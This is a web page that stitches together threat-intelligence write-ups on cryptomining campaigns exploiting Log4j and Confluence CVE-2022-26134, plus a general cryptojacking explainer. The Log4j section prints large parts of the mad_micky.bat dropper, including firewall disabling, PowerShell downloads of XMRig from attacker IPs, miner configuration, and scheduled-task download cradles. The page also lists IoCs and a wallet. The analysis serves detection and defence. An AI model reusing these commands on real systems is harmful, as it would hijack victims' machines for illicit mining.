
# Log4j Vulnerability

---


---





<figure class="aligncenter size-large"><img decoding="async" width="1024" height="576" src="./Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability - CRYPTO DEEP TECH_files/032-1024x576.png" alt="Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability" class="wp-image-1873" srcset="https://cryptodeeptech.ru/wp-content/uploads/2023/01/032-1024x576.png 1024w, https://cryptodeeptech.ru/wp-content/uploads/2023/01/032-300x169.png 300w, https://cryptodeeptech.ru/wp-content/uploads/2023/01/032-768x432.png 768w, https://cryptodeeptech.ru/wp-content/uploads/2023/01/032.png 1280w" sizes="(max-width: 1024px) 100vw, 1024px"></figure></div>


---


* Tutorial: https://youtu.be/PNDBjoT83zA
* Tutorial: https://cryptodeeptech.ru/log4j-vulnerability


---

<hr class="wp-block-separator has-alpha-channel-opacity">



<h3>Background on Log4j</h3>



<p>Alibaba Cloud Security Team publicly disclosed a critical vulnerability <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2021-44228" target="_blank" rel="noreferrer noopener">(CVE-2021-44228)</a> enabling unauthenticated remote code execution against multiple versions of Apache Log4j2 (Log4Shell). Vulnerable servers can be exploited by attackers connecting via any protocol such as HTTPS and sending a specially crafted string.</p>



<h3>Log4j crypto-mining campaign</h3>



<p>Darktrace detected crypto-mining on multiple customer deployments which occurred as a result of exploiting this Log4j vulnerability. In each of these incidents, exploitation occurred via outbound SSL connections which appear to be requests for base64-encoded PowerShell scripts to bypass perimeter defenses and download batch (.bat) script files, and multiple executables that install crypto-mining malware. The activity had wider campaign indicators, including common hard-coded IPs, executable files, and scripts.</p>



<p>The attack cycle begins with what appears to be opportunistic scanning of Internet-connected devices looking for VMWare Horizons servers vulnerable to the Log4j exploit. Once a vulnerable server is found, the attacker makes HTTP and SSL connections to the victim. Following successful exploitation, the server performs a callback on port 1389, retrieving a script named mad_micky.bat. This achieves the following:</p>



<ul>
<li>Disables Windows firewall by setting all profiles to state=off<br>‘netsh advfirewall set allprofiles state off’</li>



<li>Searches for existing processes that indicate other miner installs using ‘netstat -ano | findstr TCP’ to identify any process operating on ports :3333, :4444, :5555, :7777, :9000 and stop the processes running</li>



<li>A new webclient is initiated to silently download wxm.exe</li>



<li>Scheduled tasks are used to create persistence. The command ‘schtasks /create /F /sc minute /mo 1 /tn –‘ schedules a task and suppresses warnings, the task is to be scheduled within a minute of command and given the name, ‘BrowserUpdate’, pointing to malicious domain, ‘b.oracleservice[.]top’ and hard-coded IP’s: 198.23.214[.]117:8080 -o 51.79.175[.]139:8080 -o 167.114.114[.]169:8080</li>



<li>Registry keys are added in RunOnce for persistence: reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Run2 /d</li>
</ul>



<p>In at least two cases, the mad_micky.bat script was retrieved in an HTTP connection which had the user agent Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Win64; x64; Trident/6.0; MAARJS). This was the first and only time this user agent was seen on these networks. It appears this user agent is used legitimately by some ASUS devices with fresh factory installs; however, as a new user agent only seen during this activity it is suspicious.</p>



<p>Following successful exploitation, the server performs a callback on port 1389, to retrieve script files. In this example, /xms.ps1 a base-64 encoded PowerShell script that bypasses execution policy on the host to call for ‘mad_micky.bat’:</p>



<figure class="wp-block-image"><img decoding="async" src="./Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability - CRYPTO DEEP TECH_files/62d2a548a73d901f998b427c_1-1.jpeg" alt="Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability"></figure>



<p><em>Figure 1: Additional insight on PowerShell script xms.ps1</em></p>



<p>The snapshot details the event log for an affected server and indicates successful Log4j RCE that resulted in the mad_micky.bat file download:</p>



<figure class="wp-block-image"><img decoding="async" src="./Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability - CRYPTO DEEP TECH_files/62d2a5485d3ddb97cd7d959a_1-2.jpeg" alt="Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability"></figure>



<p><em>Figure 2: Log data highlighting mad_micky.bat file</em></p>



<p>Additional connections were initiated to retrieve executable files and scripts. The scripts contained two IP addresses located in Korea and Ukraine. A connection was made to the Ukrainian IP to download executable file xm.exe, which activates the miner. The miner, XMRig Miner (in this case) is an open source, cross-platform mining tool available for download from multiple public locations. The next observed exe download was for ‘wxm.exe’ (f0cf1d3d9ed23166ff6c1f3deece19b4).</p>



<figure class="wp-block-image"><img decoding="async" src="./Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability - CRYPTO DEEP TECH_files/62d2a548633c395a4ad861e7_1-3.png" alt="Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability"></figure>



<p><em>Figure 3: Additional insight regarding XMRig executable</em></p>



<p>The connection to the Korean IP involved a request for another script (/2.ps1) as well as an executable file (LogBack.exe). This script deletes running tasks associated with logging, including SCM event log filter or PowerShell event log consumer. The script also requests a file from Pastebin, which is possibly a Cobalt Strike beacon configuration file. The log deletes were conducted through scheduled tasks and WMI included: Eventlogger, SCM Event Log Filter, DSM Event Log Consumer, PowerShell Event Log Consumer, Windows Events Consumer, BVTConsumer.</p>



<ul>
<li>Config file (no longer hosted): IEX (New-Object System.Net.Webclient) DownloadString(‘hxxps://pastebin.com/raw/g93wWHkR’)</li>
</ul>



<p>The second file requested from Pastebin, though no longer hosted by Pastebin, is part of a schtasks command, and so probably used to establish persistence:</p>



<ul>
<li>schtasks /create /sc MINUTE /mo 5 /tn &nbsp;“\Microsoft\windows\.NET Framework\.NET Framework NGEN v4.0.30319 32” /tr “c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c ‘IEX ((new-object net.webclient).downloadstring(”hxxps://pastebin.com/raw/bcFqDdXx”’))'” &nbsp;/F /ru System</li>
</ul>



<p>The executable file Logback.exe is another XMRig mining tool. A config.json file was also downloaded from the same Korean IP. After this cmd.exe and wmic commands were used to configure the miner.</p>



<p>These file downloads and miner configuration were followed by additional connections to Pastebin.</p>



<figure class="wp-block-image"><img decoding="async" src="./Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability - CRYPTO DEEP TECH_files/62d2a54849ba531521cac33f_1-4.jpeg" alt="Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability"></figure>



<p><em>Figure 4: OSINT correlation of mad_micky.bat file</em></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3>Process specifics — mad_micky.bat file</h3>



<h4>Install</h4>



<pre class="wp-block-code"><code>set “STARTUP_DIR=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup”
set “STARTUP_DIR=%USERPROFILE%\Start Menu\Programs\Startup”

looking for the following utilities: powershell, find, findstr, tasklist, sc
set “LOGFILE=%USERPROFILE%\mimu6\xmrig.log”
if %EXP_MONER_HASHRATE% gtr 8192 ( set PORT=18192 &amp; goto PORT_OK)
if %EXP_MONER_HASHRATE% gtr 4096 ( set PORT=14906 &amp; goto PORT_OK)
if %EXP_MONER_HASHRATE% gtr 2048 ( set PORT=12048 &amp; goto PORT_OK)
if %EXP_MONER_HASHRATE% gtr 1024 ( set PORT=11024 &amp; goto PORT_OK)
if %EXP_MONER_HASHRATE% gtr 512 ( set PORT=10512 &amp; goto PORT_OK)
if %EXP_MONER_HASHRATE% gtr 256 ( set PORT=10256 &amp; goto PORT_OK)
if %EXP_MONER_HASHRATE% gtr 128 ( set PORT=10128 &amp; goto PORT_OK)
if %EXP_MONER_HASHRATE% gtr 64 ( set PORT=10064 &amp; goto PORT_OK)
if %EXP_MONER_HASHRATE% gtr 32 ( set PORT=10032 &amp; goto PORT_OK)
if %EXP_MONER_HASHRATE% gtr 16 ( set PORT=10016 &amp; goto PORT_OK)
if %EXP_MONER_HASHRATE% gtr 8 ( set PORT=10008 &amp; goto PORT_OK)
if %EXP_MONER_HASHRATE% gtr 4 ( set PORT=10004 &amp; goto PORT_OK)
if %EXP_MONER_HASHRATE% gtr 2 ( set PORT=10002 &amp; goto PORT_OK)
set port=10001</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h4>Preparing miner</h4>



<pre class="wp-block-code"><code>echo [*] Removing previous mimu miner (if any)
sc stop gado_miner
sc delete gado_miner
taskkill /f /t /im xmrig.exe
taskkill /f /t/im logback.exe
taskkill /f /t /im network02.exe
:REMOVE_DIR0
echo [*] Removing “%USERPROFILE%\mimu6” directory
timeout 5
rmdir /q /s “USERPROFILE%\mimu6” &gt;NUL 2&gt;NUL
IF EXIST “%USERPROFILE%\mimu6” GOTO REMOVE_DIR0</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h4>Download of XMRIG</h4>



<pre class="wp-block-code"><code>echo [*] Downloading MoneroOcean advanced version of XMRig to “%USERPROFILE%\xmrig.zip”
powershell -Command “$wc = New-Object System.Net.WebClient; $wc.DownloadFile(‘http://141.85.161[.]18/xmrig.zip’, ;%USERPROFILE%\xmrig.zip’)”
echo copying to mimu directory
if errorlevel 1 (
echo ERROR: Can’t download MoneroOcean advanced version of xmrig
goto MINER_BAD)</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h4>Unpack and install</h4>



<p></p>



<pre class="wp-block-code"><code>echo [*] Unpacking “%USERPROFILE%\xmrig.zip” to “%USERPROFILE%\mimu6”
powershell -Command “Add-type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory(‘%USERPROFILE%\xmrig.zip’, ‘%USERPROFILE%\mimu6’)”
if errorlevel 1 (
echo [*] Downloading 7za.exe to “%USERPROFILE%za.exe”
powershell -Command “$wc = New-Object System.Net.WebClient; $wc.Downloadfile(‘http://141.85.161[.]18/7za.txt’, ‘%USERPROFILE%za.exe’”

powershell -Command “$out = cat ‘%USERPROFILE%\mimu6\config.json’ | %%{$_ -replace ‘\”url\”: *\”.*\”,’, ‘\”url\”: \”207.38.87[.]6:3333\”,’} | Out-String; $out | Out-File -Encoding ASCII ‘%USERPROFILE%\mimu6\config.json’”
powershell -Command “$out = cat ‘%USERPROFILE%\mimu6\config.json’ | %%{$_ -replace ‘\”user\”: *\”.*\”,’, ‘\”user\”: \”%PASS%\”,’} | Out-String; $out | Out-File -Encoding ASCII ‘%USERPROFILE%\mimu6\config.json’”
powershell -Command “$out = cat ‘%USERPROFILE%\mimu6\config.json’ | %%{$_ -replace ‘\”pass\”: *\”.*\”,’, ‘\”pass\”: \”%PASS%\”,’} | Out-String; $out | Out-File -Encoding ASCII ‘%USERPROFILE%\mimu6\config.json’”
powershell -Command “$out = cat ‘%USERPROFILE%\mimu6\config.json’ | %%{$_ -replace ‘\”max-cpu-usage\”: *\d*,’, ‘\”max-cpu-usage\”: 100,’} | Out-String; $out | Out-File -Encoding ASCII ‘%USERPROFILE%\mimu6\config.json’”
set LOGFILE2=%LOGFILE:\=\\%
powershell -Command “$out = cat ‘%USERPROFILE%\mimu6\config.json’ | %%{$_ -replace ‘\”log-file\”: *null,’, ‘\”log-file\”: \”%LOGFILE2%\”,’} | Out-String; $out | Out-File -Encoding ASCII ‘%USERPROFILE%\mimu6\config.json’”
if %ADMIN% == 1 goto ADMIN_MINER_SETUP

if exist “%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup” (
set “STARTUP_DIR=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup”
goto STARTUP_DIR_OK
)
if exist “%USERPROFILE%\Start Menu\Programs\Startup” (
set “STARTUP_DIR=%USERPROFILE%\Start Menu\Programs\Startup”
goto STARTUP_DIR_OK
)
echo [*] Downloading tools to make gado_miner service to “%USERPROFILE%\nssm.zip”
powershell -Command “$wc = New-Object System.Net.WebClient; $wc.DownloadFile(‘[http://141.85.161[.]18/nssm.zip’, ‘%USERPROFILE%\nssm.zip’)”
if errorlevel 1 (
echo ERROR: Can’t download tools to make gado_miner service
exit /b 1</code></pre>



<h3>Detecting the campaign using Darktrace</h3>



<p>The key model breaches Darktrace used to identify this campaign include compromise-focussed models for&nbsp;<em>Application Protocol on Uncommon Port</em>,&nbsp;<em>Outgoing Connection to Rare From Server</em>, and&nbsp;<em>Beaconing to Rare Destination</em>. File-focussed models for&nbsp;<em>Masqueraded File Transfer</em>,&nbsp;<em>Multiple Executable Files and Scripts from Rare Locations</em>, and&nbsp;<em>Compressed Content from Rare External Location</em>. Cryptocurrency mining is detected under the&nbsp;<em>Cryptocurrency Mining Activity</em>&nbsp;models.</p>



<p>The models associated with&nbsp;<em>Unusual PowerShell to Rare and New User Agent</em>&nbsp;highlight the anomalous connections on the infected devices following the Log4j callbacks.</p>



<p>Customers with Darktrace’s&nbsp;<a href="https://www.darktrace.com/en/autonomous-response">Autonomous Response</a>&nbsp;technology, Antigena, also had actions to block the incoming files and scripts downloaded and restrict the infected devices to normal pattern of life to prevent both the initial malicious file downloads and the ongoing crypto-mining activity.</p>



<h3>Appendix</h3>



<h4>Darktrace model detections</h4>



<ul>
<li>Anomalous Connection / Application Protocol on Uncommon Port</li>



<li>Anomalous Connection / New User Agent to IP Without Hostname</li>



<li>Anomalous Connection / PowerShell to Rare External</li>



<li>Anomalous File / EXE from Rare External location</li>



<li>Anomalous File / Masqueraded File Transfer</li>



<li>Anomalous File / Multiple EXE from Rare External Locations</li>



<li>Anomalous File / Script from Rare External Location</li>



<li>Anomalous File / Zip or Gzip from Rare External Location</li>



<li>Anomalous Server Activity / Outgoing from Server</li>



<li>Compliance / Crypto Currency Mining Activity</li>



<li>Compromise / Agent Beacon (Long Period)</li>



<li>Compromise / Agent Beacon (Medium Period)</li>



<li>Compromise / Agent Beacon (Short Period)</li>



<li>Compromise / Beacon to Young Endpoint</li>



<li>Compromise / Beaconing Activity To External Rare</li>



<li>Compromise / Crypto Currency Mining Activity</li>



<li>Compromise / Sustained TCP Beaconing Activity To Rare Endpoint</li>



<li>Device / New PowerShell User Agent</li>



<li>Device / Suspicious Domain</li>
</ul>



<h4>MITRE ATT&amp;CK techniques observed</h4>



<figure class="wp-block-image"><img decoding="async" src="./Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability - CRYPTO DEEP TECH_files/62ea70a286d2172d033147de_mitre CobaltStrike .jpg" alt="Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability"></figure>



<h4>IoCs</h4>



<figure class="wp-block-image"><img decoding="async" src="./Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability - CRYPTO DEEP TECH_files/62f11eea9576fd4b2e26c440_iocs 1 log4j.jpg" alt="Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability"></figure>



<figure class="wp-block-image"><img decoding="async" src="./Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability - CRYPTO DEEP TECH_files/62f11ef37345022b8dfb2403_iocs 2 log4j.jpg" alt="Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability"></figure>



<figure class="wp-block-image"><img decoding="async" src="./Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability - CRYPTO DEEP TECH_files/62f11efdb7ece0f3fab42a28_iocs 3 log4j.jpg" alt="Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>On May 31, a critical unpatched vulnerability, which affects all confluence server and data center supported versions was&nbsp;<a href="https://www.volexity.com/blog/2022/06/02/zero-day-exploitation-of-atlassian-confluence/">reported</a>&nbsp;to Atlassian by Volexity, a security company.</p>



<p>Atlassian&nbsp;<a href="https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html">warned</a>&nbsp;their customers of the critical vulnerability on June 2 and issued a patch a day later. CISA added this vulnerability to their list of Known Exploited Vulnerabilities on June 3.</p>



<p>Check Point released a dedicated protection to prevent an attack exploiting this vulnerability and advises customers to patch the affected systems.</p>



<p><strong>The Vulnerability</strong></p>



<p>The vulnerability in the Atlassian Confluence and Data Center, designated as <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-26134" target="_blank" rel="noreferrer noopener">CVE-2022-26134</a>, may lead to an unauthenticated Object-Graph Navigation Language (OGNL) expression injection attack.</p>



<p>A remote, unauthenticated attacker can use this vulnerability to execute arbitrary code on the target server by placing a malicious payload in the URI.</p>



<p><img decoding="async" loading="lazy" src="./Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability - CRYPTO DEEP TECH_files/y1.png" alt="Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability" width="639" height="114"></p>



<p id="caption-attachment-28249">Figure 1: Malicious payload that exploits <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-26134" target="_blank" rel="noreferrer noopener">CVE-2022-26134</a>.</p>



<p><strong>In The Wild Exploitation</strong></p>



<p>Check Point Research (CPR) researchers noticed a large number of exploitations attempts since the vulnerability was published. At first, many of the would-be attackers used scanning methods to identify vulnerable targets. After a few days, the attackers started to use the vulnerability to download malware to the affected systems.</p>



<p>Among the exploitation logs, researchers noticed a few malicious payloads that are related to the same campaign and that originated from the same source but targeted different platforms: Linux and Windows.</p>



<p>The infection chain depends on the victim’s operating system.</p>



<p><strong>The Linux OS Targeted Attack</strong></p>



<p>The attacker utilized the Atlassian 0-day vulnerability by sending a crafted HTTP request to the victim.</p>



<p><img decoding="async" loading="lazy" src="./Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability - CRYPTO DEEP TECH_files/y2.png" alt="Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability" width="654" height="115"></p>



<p id="caption-attachment-28250">Figure 2: A crafted HTTP request exploiting CVE-2022-26134 with a base64 encoded payload.</p>



<p>The base64 string decodes into another base64 encoded string. Overall, researchers had to decode the string a few times to get the actual payload.</p>



<p><img decoding="async" loading="lazy" src="./Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability - CRYPTO DEEP TECH_files/y3.png" alt="Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability" width="319" height="360"></p>



<p id="caption-attachment-28251">Figure 3: The decoded base64 string.</p>



<p>This script downloads a bash script file called&nbsp;<em>xms</em>&nbsp;from the remote C&amp;C server to the victim’s tmp folder, executes it, and deletes it afterward.</p>



<p><img decoding="async" loading="lazy" src="./Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability - CRYPTO DEEP TECH_files/y4.png" alt="Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability" width="602" height="277"></p>



<p id="caption-attachment-28252">Figure 4: Part of the malicious xms script.</p>



<p>The&nbsp;<em>xms</em>&nbsp;file is a dropper script. It uninstalls running agents from the victim’s machine and adds itself to cron jobs to maintain persistence upon reboot.</p>



<p>In addition, a network connectivity test to a[.]oracleservice.top is performed constantly.</p>



<p>In an attempt to spread to other machines, the script searches for ssh keys and tries to connect. It then downloads the xms file from the C&amp;C server and executes it.</p>



<p>The script downloads an elf executable file called&nbsp;<em>dbused&nbsp;</em>to the<em>&nbsp;tmp&nbsp;</em>folder in various remote IPs.</p>



<p>The&nbsp;<em>dbused</em>&nbsp;file is packed using upx to avoid static detection.</p>



<p>The elf file is a crypto miner that exhausts the victim machine’s resources:</p>



<p><img decoding="async" loading="lazy" src="./Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability - CRYPTO DEEP TECH_files/y5.png" alt="Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability" width="532" height="113"></p>



<p id="caption-attachment-28253">Figure 5: The dbused process exhausts the system resources.</p>



<p><strong>The Windows OS Targeted Attack</strong></p>



<p>The attacker utilized the Atlassian vulnerability to execute a PowerShell download cradle to initiate a fileless attack from a remote C&amp;C server.</p>



<p><img decoding="async" loading="lazy" src="./Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability - CRYPTO DEEP TECH_files/y6.png" alt="Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability" width="616" height="96"></p>



<p id="caption-attachment-28254">Figure 6: A crafted HTTP request exploiting CVE-2022-26134 using PowerShell commands.</p>



<p>The&nbsp;<em>lol.ps1</em>&nbsp;script is injected to a PowerShell memory process.</p>



<p>The script verifies the processor’s architecture, using&nbsp;<em>wmi</em>&nbsp;to check whether it matches its requirements.<br>It then downloads an executable file called&nbsp;<em>checkit2</em>&nbsp;to the<em>&nbsp;tmp</em>&nbsp;folder and runs it in hidden mode.</p>



<p><img decoding="async" loading="lazy" src="./Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability - CRYPTO DEEP TECH_files/y7.png" alt="Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability" width="585" height="125"></p>



<p id="caption-attachment-28255">Figure 7: The lol.ps1 script.</p>



<p>The<em>&nbsp;checkit2.exe</em>&nbsp;process spawns a child process, called&nbsp;<em>InstallUtil.exe,</em>&nbsp;which connects to the C&amp;C server. The&nbsp;<em>InstallUtil.exe</em>&nbsp;in turn spawns another child process child process,&nbsp;<em>AddInProcess.exe,&nbsp;</em>which is the crypto miner. After a few moments of running on the victim’s machine, the&nbsp;<em>checkit2</em>&nbsp;process terminates itself.</p>



<p><img decoding="async" loading="lazy" src="./Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability - CRYPTO DEEP TECH_files/y8.png" alt="Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability" width="663" height="17"></p>



<p id="caption-attachment-28256">Figure 8: The checkit2.exe process running on the system.</p>



<p><img decoding="async" loading="lazy" src="./Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability - CRYPTO DEEP TECH_files/y9.png" alt="Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability" width="657" height="34"></p>



<p id="caption-attachment-28257">Figure 9: The InstallUtil.exe process running on the system.</p>



<p>The malware downloads a new copy of itself, with a new name, to the Start Menu folder.</p>



<p><img decoding="async" loading="lazy" src="./Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability - CRYPTO DEEP TECH_files/y10.png" alt="Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability" width="537" height="97"></p>



<p id="caption-attachment-28258">Figure 10: The cloud.exe file downloaded to the Startup folder.</p>



<p>The crypto miner now runs on the machine and exhausts all the system’s resources:</p>



<p><img decoding="async" loading="lazy" src="./Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability - CRYPTO DEEP TECH_files/y.png" alt="Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability" width="725" height="17"></p>



<p id="caption-attachment-28261">Figure 11: Crypto wallet information.</p>



<p><strong>Attack chain</strong></p>



<figure class="wp-block-image"><img decoding="async" src="./Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability - CRYPTO DEEP TECH_files/y11.png" alt="Exploit in the cryptocurrency mining code that used a dangerous Log4j vulnerability" class="wp-image-28259"></figure>



<p>Both attack scenarios start with an initial crafted HTTP request exploiting the CVE-2022-26134 vulnerability. The attacker executes commands using the Java execution function to download a malicious payload to the victim’s machine.</p>



<p>The malicious payload then downloads an executable file according to the affected OS. Both executables run a crypto miner to utilize the victim’s resources for their own benefit.</p>



<p><strong>Threat Actors</strong></p>



<p>The a[.]oracleservice.top domain and the crypto wallet we extracted from the system are related to a cybercriminal group called the “<a href="https://www.lacework.com/blog/8220-gangs-recent-use-of-custom-miner-and-botnet/">8220 gang</a>”.</p>



<p><strong>Check Point Protections:</strong></p>



<p>IPS:<br>Atlassian Confluence Remote Code Execution (CVE-2022-26134)</p>



<p>Anti-Bot:<br>Trojan.WIN32.XMRig</p>



<p><strong>IOCs:</strong></p>



<p>198.251.86[.]46</p>



<p>51.79.175[.]139</p>



<p>167.114.114[.]169</p>



<p>146.59.198[.]38</p>



<p>51.255.171[.]23</p>



<p>a.oracleservice[.]top</p>



<p>d2bae17920768883ff8ac9a8516f9708967f6c6afe2aa6da0241abf8da32456e</p>



<p>2622f6651e6eb01fc282565ccbd72caba9844d941b9d1c6e6046f68fc873d5e0</p>



<p>4e48080f37debd76af54a3231ecaf3aa254a008fae1253cdccfcc36640f955d9</p>



<p>4b8be1d23644f8cd5ea22fa4f70ee7213d56e3d73cbe1d0cc3c8e5dfafe753e0</p>



<p>Monero Wallet:<br>46E9UkTFqALXNh2mSbA7WGDoa2i6h4WVgUgPVdT9ZdtweLRvAhWmbvuY1dhEmfjHbsavKXo3eGf5ZRb4qJzFXLVHGYH4moQ</p>



<p><a href="https://blog.checkpoint.com/2022/12/20/is-cloud-native-security-good-enough/"></a></p>



<p></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h1>Cryptojacking explained: How to prevent, detect, and recover from it</h1>



<h3>Criminals are using ransomware-like tactics and poisoned websites to get your employees’ computers to mine cryptocurrencies. Here’s what you can do to stop it.</h3>



<h2><strong>Cryptojacking definition</strong></h2>



<p>Cryptojacking is the unauthorized use of someone else’s compute resources to mine cryptocurrency. Hackers seek to hijack any kind of systems they can take over—desktops, servers, cloud infrastructure and more—to illicitly mine for crypto coins.</p>



<p>Regardless of the delivery mechanism, cryptojacking code typically works quietly in the background as unsuspecting victims use their systems normally. The only signs they might notice is slower performance, lags in execution, overheating, excessive power consumption, or abnormally high cloud computing bills.</p>



<h2><strong>How cryptojacking works</strong></h2>



<p>Coin mining is a legitimate process in the cryptocurrency world that releases new cryptocurrency into circulation. The process works by rewarding currency to the first miner who solves a complex computational problem. That problem completes blocks of verified transactions that are added to the cryptocurrency blockchain.</p>



<p>“Miners are essentially getting paid for their work as auditors. They are doing the work of verifying the legitimacy of Bitcoin transactions,” detailed&nbsp;<a href="https://www.investopedia.com/tech/how-does-bitcoin-mining-work/" rel="noreferrer noopener" target="_blank">a recent Investopedia explainer</a>&nbsp;on how Bitcoin mining works. “In addition to lining the pockets of miners and supporting the Bitcoin ecosystem, mining serves another vital purpose: It is the only way to release new cryptocurrency into circulation.”</p>



<p>Earning cryptocurrency via coin mining typically takes a huge amount of processing power and energy to carry off. Additionally, the cryptocurrency ecosystem is designed in a way that makes mining harder and reduces the rewards for it over time and with more mining competition. This makes legitimate cryptocurrency coin mining an extremely costly affair, with expenses rising all the time.</p>



<p>Cybercriminals slash mining overhead by simply stealing compute and energy resources. They use a range of hacking techniques to gain access to systems that will do the computational work illicitly and then have these hijacked systems send the results to a server controlled by the hacker.</p>



<h2>Cryptojacking attack methods</h2>



<p>The attack methods are limited only by the cryptojackers’ creativity, but the following are some of the most common ones used today.</p>



<h3><strong>Endpoint attacks</strong></h3>



<p>In the past, cryptojacking was primarily an endpoint malware play, existing as yet another moneymaking objective for dropping malware on desktops and laptops. Traditional cryptojacking malware is delivered via typical routes like fileless malware, phishing schemes, and embedded malicious scripts on websites and in web apps.</p>



<p>The most basic way cryptojacking attackers can steal resources is by sending endpoint users a legitimate-looking email that encourages them to click on a link that runs code to place a cryptomining script on their computer. It runs in the background and sends results back via a command and control (C2) infrastructure.</p>



<p>Another method is to inject a script on a website or an ad that is delivered to multiple websites. Once victims visit the website or the infected ad pops up in their browsers, the script automatically executes. No code is stored on the victims’ computers.</p>



<p>These avenues still remain a legitimate concern, though criminals have added significantly more sophisticated techniques to their cryptojacking playbooks as they seek to scale up profits, with some of these evolving methods described below.</p>



<h3><strong>Scan for vulnerable servers and network devices</strong></h3>



<p>Attackers seek to amp up the profitability of cryptojacking by expanding their horizons to servers, network devices, and even IoT devices. Servers, for example, are a particularly juicy target since they usually are usually higher powered than a run-of-the-mill desktop. They’re also a prime hunting ground in 2022 as the bad guys scan for servers exposed to the public internet that contain vulnerabilities such as Log4J, exploiting the flaw and quietly loading cryptomining software on the system that’s connected to the hacker’s servers. Often attackers will use the initially compromised system to move their cryptojacking laterally into other network devices.</p>



<p>“We’re seeing an uptick in cryptomining stemming from the Log4J vulnerability,” says Sally Vincent, senior threat research engineer for LogRhythm. “Hackers are breaking into networks and installing malware that uses storage to mine cryptos.”</p>



<h3><strong>Software supply chain attacks</strong></h3>



<p>Cybercriminals are targeting the software supply chain by&nbsp;<a href="https://www.csoonline.com/article/3649091/npm-javascript-registry-suffers-massive-influx-of-malware-report-says.html" rel="noreferrer noopener" target="_blank">seeding open-source code repositories</a>&nbsp;with malicious packages and libraries that contain cryptojacking scripts embedded within their code. With developers downloading these packages by the millions around the globe, these attacks can rapidly scale up cryptojacking infrastructure for the bad guys in two ways. The malicious packages can be used to target developer systems—and the networks and cloud resources they connect to—to use them directly as illicit cryptomining resources. Or they can leverage these attacks to poison the software that these developers are building with components that execute cryptomining scripts on the machines of an application’s end user.</p>



<h3><strong>Leveraging cloud infrastructure</strong></h3>



<p>Many cryptojacking enterprises are taking advantage of the scalability of cloud resources by breaking into cloud infrastructure and tapping into an even broader collection of compute pools to power their mining activity. A&nbsp;<a href="https://services.google.com/fh/files/misc/gcat_threathorizons_brief_nov2021.pdf" rel="noreferrer noopener" target="_blank">study last fall by Google’s Cybersecurity Action Team</a>&nbsp;reported that 86% of compromised cloud instances are used for cryptomining.</p>



<p>“Today, attackers are targeting cloud services by any means to mine more and more cryptocurrency, as cloud services can allow them to run their calculations on a larger scale than just a single local machine, whether they’re taking over a user’s managed cloud environment or even abusing SaaS applications to execute their calculations,” Guy Arazi, senior security researcher for Palo Alto Networks, wrote&nbsp;<a href="https://www.paloaltonetworks.com/blog/security-operations/stopping-cryptojacking-attacks-with-and-without-an-agent/" rel="noreferrer noopener" target="_blank">in a blog post</a>.</p>



<p>One of the common methods to do this is by scanning for exposed container APIs or unsecured cloud storage buckets and using that access to start loading coin-mining software on impacted container instances or cloud servers. The attack is typically automated with scanning software that looks for servers accessible to the public internet with exposed APIs or unauthenticated access possible. Attackers generally use scripts to drop the miner payloads onto the initial system and to look for ways to propagate across connected cloud systems.</p>



